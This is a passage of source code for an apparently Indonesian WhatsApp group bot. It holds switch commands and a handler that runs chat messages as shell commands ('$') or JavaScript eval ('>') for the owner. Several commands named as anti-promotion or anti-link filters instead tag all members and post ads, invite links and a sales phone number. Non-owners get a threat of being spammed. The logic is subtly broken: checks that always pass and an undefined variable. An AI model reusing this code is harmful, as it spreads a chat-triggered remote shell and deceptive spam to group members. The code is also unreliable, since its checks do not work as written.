  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antipromosi': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antipromosi) return reply('Sukses Mengaktifikan Tuan✅')
antipromosi.push(from)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning on antipromosi in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antipromosi) return reply('Sukses Menonaktifkan Tuan✅')
let off = antipromosi.indexOf(from)
antipromosi.splice(off, 1)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning off antipromosi in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkall) return reply('Sukses Mengaktifikan Tuan✅')
antilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning on all antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkall) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkall.indexOf(from)
antilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkytvid': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkytvideo) return reply('Sukses Mengaktifikan Tuan✅')
antilinkytvideo.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning on youtube video antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkytvideo) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkytvideo.indexOf(from)
antilinkytvideo.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkytch': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkytchannel) return reply('Sukses Mengaktifikan Tuan✅')
antilinkytchannel.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytchannel))
reply('Success in turning on youtube channel antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkytchannel.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytchannel))
antilinkytchannel.splice(off, 1)
reply('Success in turning off youtube channel antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'autojpm': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (autojpm) return reply('Sukses Mengaktifikan Tuan✅')
autojpm.push(from)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning on autojpm in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS DI 700 MEMBER MAU GIVE AWAY VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!autojpm) return reply('Sukses Menonaktifkan Tuan✅')
let off = autojpm.indexOf(from)
autojpm.splice(off, 1)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning off autojpm in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antipannel': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antipanel) return reply('Sukses Mengaktifikan Tuan✅')
antipanel.push(from)
fs.writeFileSync('./database/antipanel.json', JSON.stringify(antipanel))
reply('Success in turning on antipanel in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6282196776245`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antipanel) return reply('Sukses Menonaktifkan Tuan✅')
let off = antipanel.indexOf(from)
antipanel.splice(off, 1)
fs.writeFileSync('./database/antipanel.json', JSON.stringify(antipanel))
reply('Success in turning off antipanel in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkgc) return reply('Sukses Mengaktifikan Tuan✅')
antilinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning on antilinkgc in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkgc) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkgc.indexOf(from)
antilinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning off antilinkgc in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU COLONG SC OWNER GW ANJ!! OTW BOT SPAM BUG😎`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})